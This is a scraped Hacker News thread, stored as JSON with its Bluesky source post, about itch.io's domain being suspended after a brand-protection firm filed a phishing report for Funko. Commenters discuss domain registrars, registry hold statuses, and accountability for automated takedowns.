[
  {
    "id": 42363727,
    "title": "Itch.io Taken Down by Funko",
    "originLink": "https://bsky.app/profile/itch.io/post/3lcu6h465bs2n",
    "originBody": "@itch.io on Bluesky /** * Minimum styles required to render splash. * * ALL OTHER STYLES BELONG IN `src/style.css` * * THIS NEEDS TO BE DUPLICATED IN `bskyweb/templates/base.html` */ @font-face { font-family: 'InterVariable'; src: url(\"/static/media/InterVariable.c9f788f6e7ebaec75d7c.ttf\") format('truetype'); font-weight: 300 1000; font-style: normal; font-display: swap; } @font-face { font-family: 'InterVariableItalic'; src: url(\"/static/media/InterVariable-Italic.55d6a3f35e9b605ba6f4.ttf\") format('truetype'); font-weight: 300 1000; font-style: italic; font-display: swap; } html { background-color: white; scrollbar-gutter: stable both-edges; } @media (prefers-color-scheme: dark) { html { background-color: black; } } html, body { margin: 0px; padding: 0px; font-family: InterVariable, -apple-system, BlinkMacSystemFont, 'Segoe UI', Roboto, 'Liberation Sans', Helvetica, Arial, sans-serif; text-rendering: optimizeLegibility; /* Platform-specific reset */ -webkit-overflow-scrolling: touch; -webkit-text-size-adjust: 100%; -webkit-font-smoothing: antialiased; -moz-osx-font-smoothing: grayscale; -ms-overflow-style: scrollbar; font-synthesis-weight: none; } html, body, #root { display: flex; flex: 1 0 auto; min-height: 100%; width: 100%; } #splash { position: fixed; width: 100px; left: 50%; top: 50%; transform: translateX(-50%) translateY(-50%) translateY(-50px); } /* We need this style to prevent web dropdowns from shifting the display when opening */ body { width: 100%; }JavaScript Required This is a heavily interactive web application, and JavaScript is required. Simple HTML interfaces are possible, but that is not what this is. Learn more about Bluesky at bsky.social and atproto.com.Post itch.io itch.io did:plc:oy37ivqnriw6nx3lrbcht2u3 I kid you not, @itch.io has been taken down by Funko of \"Funko Pop\" because they use some trash \"AI Powered\" Brand Protection Software called Brand Shield that created some bogus Phishing report to our registrar, iwantmyname, who ignored our response and just disabled the domain 2024-12-09T07:13:32.505Z",
    "commentLink": "https://news.ycombinator.com/item?id=42363727",
    "commentBody": "Itch.io Taken Down by Funko (bsky.app)947 points by spiralganglion 11 hours agohidepastfavorite387 comments leafo 10 hours agoI'm the one running itch.io, so here's some more context for you: From what I can tell, some person made a fan page for an existing Funko Pop video game (Funko Fusion), with links to the official site and screenshots of the game. The BrandShield software is probably instructed to eradicate all \"unauthorized\" use of their trademark, so they sent reports independently to our host and registrar claiming there was \"fraud and phishing\" going on, likely to cause escalation instead of doing the expected DMCA/cease-and-desist. Because of this, I honestly think they're the malicious actor in all of this. Their website, if you care: https://www.brandshield.com/ About 5 or 6 days ago, I received these reports on our host (Linode) and from our registrar (iwantmyname). I expressed my disappointment in my responses to both of them but told them I had removed the page and disabled the account. Linode confirmed and closed the case. iwantmyname never responded. This evening, I got a downtime alert, and while debugging, I noticed that the domain status had been set to \"serverHold\" on iwantmyname's domain panel. We have no other abuse reports from iwantmyname other than this one. I'm assuming no one on their end \"closed\" the ticket, so it went into an automatic system to disable the domain after some number of days. I've been trying to get in touch with them via their abuse and support emails, but no response likely due to the time of day, so I decided to \"escalate\" the issue myself on social media. reply vasco 5 hours agoparentHope you have money to fight them. I stuck to my guns on a wrongful one like this and while Digitalocean and Cloudflare both had my backs (surprisingly before I even asked, both of them got a lot of good will on that - they informed me they already checked and it was spurious!). Google didn't have my back though and immediately caved when they upgraded their sham copyright infringement claim to money laundering and fraud based on nothing - a fully static website with no backend calls. Good luck! I still have the sites exactly as they were just to spite them and will keep running them at a loss until I'm dead. Copyright infringement my ass. This abuse has got to stop sometime. reply latexr 4 hours agorootparent> I still have the sites exactly as they were just to spite them and will keep running them at a loss until I'm dead. https://en.wikipedia.org/wiki/Spite_house https://en.wikipedia.org/wiki/List_of_Curb_Your_Enthusiasm_e... reply joseda-hg 3 hours agorootparentprevIf they are fully static couldn't they probably be run at close to 0 cost from you? reply vasco 3 hours agorootparentYes I'm not the pope, it's a cheap server. Still doesn't make any money. reply SparkyMcUnicorn 1 hour agorootparentIf it's a static site, you could move it to Cloudflare Pages to reduce the cost to zero. reply vasco 1 hour agorootparentAnd make my story worse? I feel like to optimize for spite I need to pay a little as well. You made me laugh though - have a good day :) reply RestartKernel 9 hours agoparentprevThis issue aside, thanks for doing what you do. I was kind of expecting Itch to get sold to some holdings or casino company at some point, as good things tend to go, but I've been happily surprised to see it mature independently throughout the years. reply Tepix 9 hours agorootparentI agree itch.io is awesome! Edit: And i'm happy to see that it's working again as of 2024-12-09 12:27 UTC+1 reply raxxorraxor 5 hours agorootparentAnd compared to that brandshield users should be branded by their business practices. Also the hoster as well. Seems to be a difficult time for hosters and also again a demonstration that copyright law is deeply flawed, even if using stolen assets is a rising problem. reply saghm 3 hours agorootparentI don't disagree that copyright law is deeply flawed, but even with the current law, it seems like this situation could easily have been avoided. The issue is one malicious private company (Brandshield) taking advantage of the negligence of another private company (the registrar) by claiming that a site was being used for \"fraud and phishing\". If anything, the parent comment from the person running the site makes me think that the situation would have been _less_ messed up if Brandshield had correctly asked for the offending copyrighted content to be taken down rather than falsely alleging something more severe. I understand that Brandshield probably has been incentivized to act this way due to copyright law, but I'd argue that even reasonable laws will sometimes cause bad actors to try to take advantage of things, and the easiest way to fight back against this isn't to try to change laws to avoid this but for non-malicious entities like the registrar not to allow their customers to get exploited by this sort of behavior. Unfortunately, domain registration is an industry with so many of its own problems that I'm not sure \"vote with your wallet\" would be an effective strategy for changing things here. I honestly wonder if domain registration might be the more fruitful target for legislation protecting customers if the goal is specifically to avoid situations like this one, but even as someone who's usually unabashedly in favor of consumer protection regulations, I can't say I have a high degree of confidence that any changes here would be done effectively. reply raxxorraxor 2 hours agorootparentA bad law is bad if it leads to injustice even beyond its original scope. We have seen numerous problems with DMCA abuse and copyright strikes in other forms. We have patent trolling and this abuse artificially feds a whole industry of dubious lawyers. I think this is not even a small problem and all these factors combined does make it a bad law, even if it would still protect innovation like it once was to meant to do, which is questionable as well. Of course services like the registrar need protection here too. And certain false copyright claims probably need consequences as well. The legal industry servers no function here. Also, it would be legally trivial to make the user accountable for the offense, not the whole of itch.io. Sure, there would be problems here as well, but there is not large barrier to not have a parasitic legal industry and have those responsible that actually commit the offense. The problem of enforcement cannot be put on the back of the platform itself. reply duggan 10 hours agoparentpreviwantmyname was bought out by a conglomerate, “Team Internet[1]”, a few years ago. Prices went up, service went down. I’d recommend moving your domains when you can (Porkbun have been good, though I haven’t had any incidents like this). Best of luck! 1: https://en.m.wikipedia.org/wiki/Team_Internet reply betteryet 8 hours agorootparentSame thing with Gandi, which is a shame. Domain renewal price silently went up 3x or so last year after getting acquired. reply colejohnson66 5 hours agorootparentCheck out Porkbun. https://porkbun.com/ reply bovermyer 3 hours agorootparentHow is Porkbun compared to Namecheap? reply no_wizard 2 hours agorootparentPorkbun is best on the market at this point. Namecheap I find is less easier to use and sometimes higher cost over time. I also haven’t had reliable domain renewal service from them when I used them. Granted this is all a few years back. I was at Cloudflare until this year when I switched to Porkbun and I’ve been very happy reply derefr 1 hour agorootparentWhy'd you switch away from Cloudflare['s registrar]? reply pengaru 1 hour agorootparentprevI tried porkbun after comments like yours when one of my domains needed renewal, but had to transfer out after one year when their payment gateway refused to work and was very poorly handling the situation while my domain risked expiration. dynadot.com has been superior in my experience. reply qingcharles 2 hours agorootparentprevI use Spaceship now for everything, which is actually Namecheap but cheaper. reply funkdude 3 hours agorootparentprevGandi's prices rose, which sucks, but they were great when I had a dispute with AFNIC over a blocked domain. They won brownie points with that. reply robin_reala 7 hours agorootparentprevIn the same way that “Don’t be evil” has disappeared, Gandi’s “No bullshit!” is no longer a thing. reply kmlx 6 hours agorootparentprevdoes anyone here use cloudflare as a registrar? i’m interested in any potential negatives. reply seanwilson 5 hours agorootparentI've helped move a few domains from Gandi to Cloudflare. The move was relatively straightforward (couldn't get the Gandi records export to import into Cloudflare so had to do it manually...), and the new domain and renewal prices are lower. To replace Gandi email (that Gandi went from free to ramping up the pricing for when they were taken over), Cloudflare offer email forwarding so you can receive incoming mail from a custom domain to e.g. a gmail account, and for sending mail you can pair this with a custom SMTP service like https://www.smtp2go.com (1000 emails/month on the free tier). Apart from that, DNS is something I barely touch for years sometimes so I don't find much difference between registrars beside their pricing and how much you can trust them. Being able to point your Cloudflare nameserver records would be nice though, so worst case you'd need to move everything if another registrar had some services you were interested in? Would be curious to know more about how common this scenario comes up and why. reply atkailash 3 hours agorootparentYou should check out something like DNSControl. Makes switching or having multiple easy. I have mine going to a bind zone file and cloudflare, and use the bind file for Unbound reply gregoryl 19 minutes agorootparentFYI, you are hellbanned (your comments are auto [dead], very few people will see them). Email hn@ycombinator.com to fix it :) reply thomasfortes 6 hours agorootparentprevYou're stuck with cloudflare nameservers¹, so if you want to change nameservers you need to transfer them to other registrar, how much of a deal breaker this is is up to you, to me is project dependent. 1. Section 6.1 of https://www.cloudflare.com/domain-registration-agreement/ reply red-iron-pine 5 hours agorootparent> 6.1 Nameservers. Registrant agrees to use Cloudflare’s nameservers. REGISTRANT ACKNOWLEDGES AND AGREES THAT IT MAY NOT CHANGE THE NAMESERVERS ON THE REGISTRAR SERVICES, AND THAT IT MUST TRANSFER TO A THIRD PARTY REGISTRAR IF IT WISHES TO CHANGE NAMESERVERS. there are very few parts of that contract in all caps, but that's one of them :/ reply technotarek 5 hours agorootparentprevI’ve got about twenty domains listed with them. No problems after 2-3 years, but I do wonder whether it’s a good idea to use the same vendor for DNS and domain registration. reply indigodaddy 4 hours agorootparentNormally a registrar isn't going to have top tier DNS infra so you may as well separate, yes. Exceptions might be CF/Google/AWS/DO, but personally I don't like to use the big guns as registrars in any case. I use Namesilo and never had any issues but on the other hand have never run into any of these sorts of issues either.. reply xnyanta 3 hours agorootparentprevI am happily using them for all of my domains they support. The problem with Cloudflare registrar is that they flat out don't support many domains/tlds. reply bambax 7 hours agorootparentprevYes it's despicable. I'm moving my domains from Gandi one at a time and the cost is 4 times less!! reply spondyl 10 hours agorootparentprevOh damn, I didn't know this! I've used their services for ages and even got to briefly meet the founders once in Wellington who gave a talk on Erlang. Ah well, while it sucks that the good times may be over, I'm glad the founders got their exit :) reply kaoD 8 hours agorootparent> I'm glad the founders got their exit I'm not. I mean, I am happy for them but this concept of growing a business to an exit is not going well for society as a whole (at least the exits that are in my areas of interest, so I assume it extrapolates to all exits). Every single business that gets bought out gets instantly enshittified in one way or another, always to the detriment of the customer. Depending on how entrenched it was it takes a different amount of time for people to move on as the new shareholders extract its economical value, but it almost always destroys societal value in the process as the company becomes a shadow of its former self (and hopefully dies, leaving way for the cycle to start again). I wish there was a way for founders to get rich without the need for an exit, so the business could keep running... but I guess ruthless enshittification is the only way to get rich? Apologies for the tangent, this is something that's been bouncing in my mind for a while... reply ChrisMarshallNY 3 hours agorootparentI know that I'm basically being trollbait (around here), by saying this, but I personally believe that the very existence of an \"exit plan\" is a problem. A business is supposed to be an ongoing, perpetual enterprise. Maybe it grows, maybe it stays the same, but it isn't something that should (in my opinion) be designed as a product, in itself, with a \"sell by\" date. If it gets brought up, then that's [maybe] good, but it shouldn't actually be in the business plan. It's just a random lifecycle event. We can plan to be ready for it, but it shouldn't be a corporate goal. It's quite possible to do that. I worked for nearly 27 years, for a company that is over 100 years old. I think the world's oldest company is over 1,400 years old, and just got brought out, for the first time, about 10 years ago. reply babuskov 7 hours agorootparentprevAgreed. Promising stuff like \"Hey we built this because everything else is bad\" and then years later selling it to a company that turns it bad is somehow even worse than classic bait and switch. reply kiba 8 hours agorootparentprevSell it to the employees? It won't be lucrative to selling it to someone with more cash than sense, but it may be more likely to preserve the value. There's no guarantee of course, and there's so little experience societal wide in running an employee co-op. reply robertlagrant 7 hours agorootparentThere are a few employee co-ops, but I don't know how good they are. Over here in the UK we have the Co-op[0], which is a national chain of small local shops. It's a consumer co-operative rather than a workers' cooperative, though. I don't know how well it works, or what its challenges are, but it definitely exists. [0] https://www.co-operative.coop reply bluehatbrit 4 hours agorootparentThe Co-op (referred to in [0]) is also a bank, funeral directors, insurer, and solicitor! They're really quite successful to be honest. Nationwide is another example of a successful cooperative as well (large UK bank, particularly in the mortgage space). They're customer and employee owned I believe, my wife and I got £200 last year as a profit share for being customers. I'm a huge fan of the model, but it's difficult to get going. I think they're also more expensive to run as their operations tend to be a little more complex. reply Angostura 5 hours agorootparentprevDon’t forget John Lewis/Waitrose and the excellent Richer Sounds: Richer Sounds boss in £3.5m staff giveaway https://www.bbc.com/news/business-48269171 reply fallingknife 7 hours agorootparentprevEvery time that happens it just makes an opportunity for someone else to start a new competitor reply Nullabillity 6 hours agorootparentIt's absolutely tiresome having to keep up with that rat race for everything. And if that principle actually worked then enshittification wouldn't be profitable to engage in to begin with. reply justsomehnguy 7 hours agorootparentprev> I mean, I am happy for them but this concept of growing a business to an exit is not going well for society as a whole The last thing I want is to be a 70 y/o still supporting a registrar. Especially considering the margins. reply dartos 5 hours agorootparentYou can be responsible with an exit and sell to someone you’d believe will keep the company’s mission. reply justsomehnguy 22 minutes agorootparentAnd what if I can't find anyone? And what if they do 180 a week later? And it's not like running a registrar is something what can even have a mission other than earning money. reply travisgriggs 4 hours agorootparentprevBonus points for using “enshittified”. reply duggan 8 hours agorootparentprevYeah I was a fan, had every domain with them that I could! But once they were acquired their .org renewal prices just did not make sense any more, and they were missing some functionality that I thought was crucial and didn't seem inclined to add it (can't remember what it was now, maybe MFA). Domains are like car insurance – there's no reward for loyalty, so makes sense to shop around come renewal time. reply thomasfromcdnjs 8 hours agorootparentprevaw I've always loved iwantmyname, I haven't noticed any issues other than the price increases. Though it was the indie/personal feel they had as a registrar, I might look for alternatives. reply donohoe 7 hours agorootparentprev+1 for Porkbun reply internet101010 42 minutes agorootparentAfter so many people in this thread recommended them I decided to make the switch from hover. Their renewal rates have gotten wild. reply FunnyLookinHat 7 hours agorootparentprevCame here to recommend Porkbun - I've had great experience with them and so have all of the friends and family I've recommended. reply raverbashing 9 hours agorootparentprevPro-tip: raise your prices before you need to sell your service to cover expenses reply johnnyanmac 8 hours agorootparenthttps://domainincite.com/24614-centralnic-to-pay-3-4-million... I appreciated the indie feel as well, but I can't blame someone for selling out to the tune of 7 figures when the opportunity arises. reply jen729w 7 hours agorootparentI see you’re being downvoted on Hacker News for what appears to be an expression of support for founders selling out for millions of dollars. We have arrived at peak hypocrisy. reply foobarchu 1 hour agorootparentHN is just a news aggregator. Being a participant does not mean one agrees with YCombinator's business practices, nor does it imply any other requisite opinions. So I don't see the hypocrisy reply esskay 6 hours agorootparentprevAnother vote for porkbun here. By far one of the best registrars out there right now. reply TheEnbyperor 8 hours agoparentprevI run a domain registrar. \"serverHold\" is not a status that iwantmyname could've set. If they had suspended the domain it'd have \"clientHold\" set. Server Hold means the registry (i.e. .io directly) has suspended the domain. Your best bet would be to contact the Internet Computer Bureau Ltd who run .io at admin@icb.co.uk, or the registry technical support provider Identity Digital at techsupport@identity.digital. reply kj4ips 4 hours agorootparentI've heard a ton of stories about .io, IMO, they play fast and loose in a space where that isn't okay, and they get away with it mostly because they are a ccTLD. The last time someone I knew had an issue, they had to get a senator to make waves to get anything resolved. reply 0x38B 4 hours agorootparentI regret going with .io for my personal domain name. At the time I thought it was cool, but they've since raised prices and hearing things like this doesn't instill confidence... reply sigio 2 hours agorootparentThat, and the Indian Ocean territory will cease to exist in the (very) near future, so the .io domains might be going the way of the dodo. I won't be registering any new ones at least, and recommending everyone to stay away from them. reply qingcharles 2 hours agorootparentprevAnd isn't .io on borrowed time, since the country will soon no longer exist? reply Suppafly 21 minutes agorootparentDo they get rid of TLDs once the country they are assigned to goes away? I assumed they'd sell them to someone or something. reply CaptainFever 9 hours agoparentprevI really wish BrandShield didn't use AI as a marketing term. It just looks like it's doing a generic ctrl-F on webpages? Then things like this happen, and people think \"ooh AI is bad, the bubble must burst\" when this has nothing to do with that in the first place, and the real issue was that they sent a \"fraud/phishing report\" rather than a \"trademark infringement\" report. Then I also wish that people who knew better, that this really has nothing to do with AI (like, this is obviously not autonomously making decisions any more than a regular program is), to stop blindly parroting and blaming it as a way to get more clicks, support and rage. reply pdpi 7 hours agorootparentI find that businesses that bill themselves as ${TOOL}-users instead of ${PROBLEM}-solvers are, as a general rule, problematic. I couldn't possibly care any less whether a product is built on AI or a clever switch statement or a bazillion little gnomes doing the work by hand. I care that it solves a problem. AI does need to die. Not so much because LLMs are bad, but rather because, like \"big data\" and \"blockchain\" and many other buzzwordy tools before it, it is a solution looking for a problem. reply 7thaccount 6 hours agorootparentThe AI hype is annoying in my field as well. AI can have its uses, but we already figured out where to use it in my field ages ago. That doesn't stop people from hyping nothing though. reply johnnyanmac 8 hours agorootparentprev> and people think \"ooh AI is bad, the bubble must burst\" when this has nothing to do with that in the first place That haphazard branding and parroting is exactly why the bubble needs to burst. Bubbles bursting take out the gritters and rarely actually kills off all the innovation in the scene (it kills a lot, though. I'm not trying to dismiss that). reply kombookcha 7 hours agorootparentExactly this, if you give a hoot about actual useful applications for AI, there is a great need to clear out all the grifters and scammers attracted by the initial hype cycle. reply CaptainFever 9 hours agorootparentprevIt's possible they were using LLMs (or even just traditional ML algorithms) to choose if a certain webpage was fraud/phishing instead of mere trademark infringement, though. In this case it makes sense that one would be angry that a sapient being didn't first check if the report was accurate before sending it off. reply acka 8 hours agorootparentMore than the hypothetical risk of Earth being consumed by a paperclip-making machine, I believe the real and present danger in the use of ML and AI technology lies in humans making irresponsible decisions about where and how to apply these technologies. For example, in my country, we are still dealing with the fallout from a decision made over a decade ago by the Tax Department. They used a poorly designed ML algorithm to screen applicants claiming social benefits for fraudulent activity. This led to several public inquiries and even contributed to the collapse of a government coalition. Tens of thousands of people are still suffering from being wrongly labeled as fraudulent, facing hefty fines and being forced to repay so-called fraudulent benefits. reply stevoski 7 hours agorootparentThey’re talking about Australia, and the robodebt scheme. Read the Wikipedia article and you’ll probably feel outraged. https://en.wikipedia.org/wiki/Robodebt_scheme reply shakna 4 hours agorootparentUnfortunately it seems that the thinking is more farspread, and this was the Netherlands [0]. [0] https://news.ycombinator.com/item?id=42365837 reply CaptainFever 8 hours agorootparentprevPerhaps in certain cases requiring someone to sign off, and take the blame if anything happens, would help alleviate this problem. Much like how engineers need to sign off on construction plans. (Layman here, obviously.) reply jerf 4 hours agorootparentIf the legal system is not itself either fundamentally corrupted or completely razzle-dazzled by the AI hype... and I mean those as serious clauses that are at least somewhat in question... then there are going to be some very disappointed people losing a lot of money or even going to jail when they find out that as far as the legal system is concerned, there already is legally speaking some person or entity composed of persons (a corporation) responsible for these actions, and it is already not actually legally possible to act like a bull in a china shop and then cover it over by just pointing to your internal AI and disclaiming all responsibility. The legal system already acts that way when the issue is in its own wheelhouse: https://www.reuters.com/legal/new-york-lawyers-sanctioned-us... The lawyers did not escape by just chuckling in amusement, throwing up their hands, and saying \"AIs! Amimrite?\" The system is slow and the legal tests haven't happened yet but personally I see no reason to believe that the legal system isn't going to decide that \"the AI\" never does anything and that \"the AI did it!\" will provide absolutely zero cover for any action or liability. If anything it'll be negative as hooking an AI directly up to some action and then providing no human oversight will come to be ipso facto negligence. I actually consider this one of the more subtle reasons this AI bubble is substantially overblown. The idea of this bubble is that AI will just replace humans wholesale, huzzah, cost savings galore! But if companies program things like, say, customer support with AIs, and can then just deploy their wildest fantasies straight into AIs with no concern about humans being in the loop and turning whistleblower or anything, like, making it literally impossible to contact humans, making it literally impossible to get solutions, and so forth, and if customers push these AIs to give false or dangerous solutions, or agree to certain bargains or whathaveyou, and the end result is you trade lots of expensive support calls for a company-ending class-action lawsuit, the utility of buying the AI services to replace your support staff sharply goes down. Not necessarily to zero. Doesn't have to go to zero. It just makes the idea that you're going to replace your support staff with a couple dozen graphics cards a much more incremental advantage rather than a multiplicative advantage, but the bubble is priced like it's hugely multiplicative. reply wholinator2 6 hours agorootparentprevHello, I'm legitimately trying to be helpful. I would look at the comma rules for English again. I used to just pepper them around sentences all willy-nilly until my mother beat it out of me (not literally). Incorrect comma usage made your comment _very_ hard to read. I believe you mean Perhaps in certain cases, Requiring someone to sign off and take the blame if anything happens would help alleviate this problem. Instead of Perhaps in certain cases requiring someone to sign off And take the blame if anything happens Would alleviate this problem reply jcranmer 5 hours agorootparentThe comment you are replying to is using commas correctly: it's partitioning off a clause of the sentence as a side phrase that can be removed, and the resulting sentence is a fully grammatically-correct sentence. If you really hate commas, you can replace the commas here with parentheses, but honestly, I prefer the commas here. reply BalinKing 3 hours agorootparentI agree with the parent that in formal written English, the comma would be incorrect—cf. the \"In compound predicates\" section in [0]. But I disagree that the sentence is hard to parse as a result, and I doubt many would think twice about it given that we're on an informal internet message board. [0] https://www.grammarly.com/blog/punctuation-capitalization/co... reply rjmunro 7 hours agorootparentprevPlease say something like \"here in [insert country name]\", or \"back home in [insert country name]\" intead of \"in my country\", otherwise we have no idea what you are talking about. reply acka 6 hours agorootparentUnfortunately I can no longer edit my original comment. It is about the so-called \"Toeslagenaffaire\" (childcare benefits scandal)[1] in the Netherlands. Also, here is a blog post[2] warning about the improper use of algorithmic enforcement tools like the one that was used in this scandal. [1] https://en.wikipedia.org/wiki/Dutch_childcare_benefits_scand... [2] https://eulawenforcement.com/?p=7941 reply jandrese 4 hours agorootparentprevWhen AI is being used as a cover for the bad/questionable behavior the company was already doing then there is no bubble to burst. The performance of the \"AI\" doesn't matter, only that it throws up a smoke shield in front of the company when people call to complain about the abuse. reply oneeyedpigeon 9 hours agorootparentprevI fear that ship has already sailed. I think the grifters and scammers have already abused the term enough that even decent uses of it are now tainted. I know that the two aren't strictly the same, but I would suggest using \"Machine Learning\" instead, which I think has more respectable connotations. reply rsynnott 9 hours agorootparentAS IS TRADITION. (After the previous AI bubble, no-one mentioned the dread term for about 20 years, instead using the safely ultra-broad umbrella term.) reply rsynnott 9 hours agorootparentprevI mean, whether this has anything to do with AI or not (I’d buy that they’re using LLMs to write abuse letters or similar) it fits very nicely into the general pattern of AI breaking the internet through an endless deluge of worthless misleading spam. So, perhaps call it honorary AI? reply npteljes 9 hours agoparentprevBrandshield is bad for overreacting, and iwantmyname is very bad for hosting such a crucial infrastructure, and having not responded to a paying customer with a good track record. I honestly don't think time of day matters, as long as the nature of the service is that it's provided and used 24/7, support staff should also be there 24/7. reply oneeyedpigeon 10 hours agoparentprevI noticed that iwantmyname has very little presence on social media: no bluesky account and a twitter account that posts once or twice a year. That wouldn't necessarily be a problem if they responded to emergencies like this promptly, but they clearly don't so it is. I also wonder if their \"automatically disable\" policy takes size/importance of site into account. Is this how they would treat all their domain owners, regardless of significance? reply clarionbell 10 hours agorootparentThe significant ones have lawyer writing them letters. reply Cthulhu_ 3 hours agoparentprevI've had the same thing happening; I run a simple forum, and some years ago people were discussing a manga, posting images of fan translated pages. My hosting party (Hetzner) forwarded the emails and / or put it in their own system, I removed the offending images / page, replied to the email, and done, right? Wrong, the email said I had to fill in a statement through some online form somewhere; I did that too late and got more and more threatening emails like \"pack your shit we're evicting you in 24 hours\". Nobody seemed to actually read my replies / explanation, probably because this is so routine for them. And I get it, nobody can be arsed to read longwinded explanations and the like for routine operations. I hope AI assisted tooling will help the overworked support employees with making decisions in favor of giving people the benefit of the doubt and the help they need; for them it's routine, but for me it was the first time I got anything like that. reply paxys 7 hours agoparentprev> Because of this, I honestly think they're the malicious actor in all of this. While I agree, the people who hired them are equally culpable. You don't get to wash your hands of the mess just because someone else is doing your dirty work. reply breakingcups 9 hours agoparentprevFiling false reports like this should count as fraud. reply Suppafly 18 minutes agorootparent>Filing false reports like this should count as fraud. It does, but they never mess with anyone with big enough pockets to get sued for it. reply terminalbraid 7 hours agorootparentprevI'm in the outraged crowd and there should be pretty serious consequences, but it is important in the interest of justice to differentiate between fraud, negligence, and gross incompetence. reply ndsipa_pomu 4 hours agorootparentWhilst I agree in principle that deliberate disruption of other people's websites/serivces should be more harshly punished, I don't think it's particularly practical. There's so many ways that modern companies can obfuscate the reasoning behind what they do, so I've come to the conclusion that if they're causing harm to someone else, then they should be punished/made to pay no matter their excuse. If companies hide behind negligence/incompetence, then we need to make it costly for them to be negligent/incompetent. reply joquarky 1 hour agorootparentprevDiscerning intent is a waste of time and resources in cases like this. reply Gigachad 7 hours agorootparentprevAs long as you have some automated AI bot sent all the reports. It’s never fraud, you couldn’t have known it would do that. reply babuskov 7 hours agorootparentLooks like AI is becoming a perfect excuse to do whatever you like. It's like having a dangerous dog that usually doesn't bite, but you really cannot know if it will change its mind one day. Do you just let such dog walk the streets without owner supervision? reply Sohcahtoa82 1 hour agorootparent> It's like having a dangerous dog that usually doesn't bite, but you really cannot know if it will change its mind one day. In other words, a pit bull. reply nkrisc 6 hours agorootparentprevWhich is why anyone deploying AI solutions should be held accountable for whatever the AI does, as if they had done it personally and intentionally. It’s irresponsible to deploy AI if you don’t know what it will do, especially when there are actual stakes. Maybe we’ll have less AI bullshit then. reply concerndc1tizen 8 hours agorootparentprevI.e. as a crime rather than just a civic tort? I agree. reply pdpi 7 hours agorootparentAs general rule, I find that sort of thing to be an over-reaction, but submitting a complaint for phishing instead of a plain old DMCA takedown does warrant it. reply kevingadd 54 minutes agorootparentprevIt does but there's no actual way to get legal recourse for false DMCA notices or anything similar. The legal system is stacked for the abusers to have their way and the victims to have no recourse, regardless of how egregious the abuse is. reply RobotToaster 5 hours agorootparentprevIsn't it already classed as perjury? reply plorkyeran 2 hours agorootparentNo, the perjury aspect of a DMCA takedown (which isn't even applicable here as that's not what they did) is if you don't actually represent the person that you claim to be filing a takedown on behalf of. reply hresvelgr 9 hours agoparentprevIt's surprising that this happened at all. Isn't it in most business's best interests to be aware of their most high-profile customers? If this was an automatic process, it's pretty disappointing that it even occurred. If I was running a SaaS, I'd probably want to mark my important accounts so an actual human has to investigate any raised alerts instead of being dealt with by a cron. reply cipheredStones 7 hours agorootparentSomething being in a business's best interests is very far from a guarantee that it'll happen. I've worked on a team in a household-name big tech company where our mission was almost exactly \"make sure we're not blowing up our most important customers for no reason\". It's not nearly as easy as it sounds: defining who's important is hard, and defining what should and shouldn't be allowed is hard, and then implementing that all correctly and avoiding drift over time is tricky too. reply Scramblejams 1 hour agorootparentSounds like you could write a series of blog posts I’d like to read! reply paxys 7 hours agorootparentprevDomain names themselves are a loss leader for registrars. They make money by upselling customers on hosting, email, certificates, analytics etc. So if you are just paying a couple dollars a year for a domain name and nothing else, your profile doesn't really matter. You are in the lowest tier of customers. reply jeremyjh 5 hours agorootparentIt still matters who your customer is if your mistreatment of them drags your own brand name through the mud in a front page Hacker News story. reply codatory 1 hour agoparentprevSmells like tortious interference to me... and likely some form of perjury. I'd probably stop talking to them now that service is restored and get in touch with legal representation. reply thn-gap 4 hours agoparentprevI wanted to take the time to thank you for the service you provide. itch.io is unvaluable to the indie community, and I'm perplexed when I see some devs complain about issues like this. Thabks for all your work. reply nonplus 1 hour agoparentprevI hope you come out of this in good shape. I try to get all my (digital) TTRPGs and indie games through your platform. reply rpastuszak 9 hours agoparentprevIs it possible/worth to hold them financially accountable for this? (them being IWMN or BrandShield) reply meaydinli 1 hour agoparentprevBehavior from \"iwantmyname\" doesn't sound like they deserve your business anymore. reply Arch485 7 hours agoparentprevI smell a class action lawsuit. That's a whole lot of lost revenue and time for you and itch.io's creators. Godspeed! reply nstart 7 hours agoparentprevFor what it's worth, I know Namecheap gets a meh rep, but we've been on the receiving end of several phishing/copyright reports and have responded across the spectrum in terms of time span. We've responded immediately. We've responded with an hour or so to go. In all cases, Namecheap has somehow responded quickly and resolved the issue. reply rexreed 7 hours agorootparentI coincidentally just this past week ran into a major issue with Namecheap on a fraudulent domain marketplace sale that they did not resolve properly or in a timely manner. They deserve their meh reputation. They were decent about a decade ago. Come renewal my domains up for sale are moving to Dynadot. Was considering porkbun but I sense they are heading the namecheap way. reply Sindisil 4 hours agorootparent> but I sense they are heading the namecheap way What makes you say that? reply rexreed 1 hour agorootparentSome of the comments and feedback I'm seeing in the reddit: https://old.reddit.com/r/PorkBun/. But then again I don't have any firsthand experience with these issues, so who knows. Are you having good experiences with Porkbun? reply oneeyedpigeon 8 hours agoparentprev(FYI, if you didn't already notice this, you're probably far too busy anyway, but still: https://bsky.app/profile/botherer.bsky.social/post/3lcuitcck...) reply tonygiorgio 2 hours agoparentprevUnfortunately \"serverHold\" goes above registrars. I learned this the hard way. There's a variety of watchdogs that false flag things all the time, and a handful of tld's that will blindly obey these orders. I'm guessing io is one of these. You'll have to escalate it with them, though I was never successful. Good luck. reply egorfine 8 hours agoparentprev> I had removed the page and disabled the account Did this account violate your ToS or the actual law? While I totally understand where are you coming from and I would probably be forced to do the same, I still tend to believe that closing a fan account is exactly the same thing that your registrar did to you. reply 0x073 8 hours agorootparentIt's not optimal, but he must choose between every published game there and one fanpage. Besides that, there are so many websites with copyright content that never changes the domains, is just the domain registration bad or why they just disabled the domain? reply egorfine 8 hours agorootparentIt's not optimal, but the registrar had to choose between every registered domain there and one business. But yes, no doubt, that system is broken and the registrar should have known better. reply 0x073 8 hours agorootparentI don't know the company size, but as a paying customer I expect them better support and more time. If they have a customer like steam would they just cut off the domain? Probably not. Other domain registrations would just ignored this and nothing would happened. reply egorfine 7 hours agorootparent> I expect them better support I expect total ignorance from a typical domain registrar. > If they have a customer like steam would they just cut off the domain? Probably not. Take a look who is they registrar and then look their prices up. > Other domain registrations would just ignored this and nothing would happened Yeah, they would totally ignore their customer just like that one did. Unfortunately, providing proper support and protecting own customers in digital realm is an unsustainable business practice for most registrars. reply Sebb767 6 hours agorootparent> Take a look who is they registrar and then look their prices up. So, in case anyone is interested, their registrar is MarkMonitor Inc., with a pricing of \"contact us\". The only pricing info I could find [0] said that it's 20$/yr for a .com, but with a minimum spend of 10k$ (probably reached by using their other services, such as the stated purpose of monitoring of trademarks). [0] https://news.ycombinator.com/item?id=18063232 reply TiredOfLife 6 hours agorootparentprevIt's not optimal, 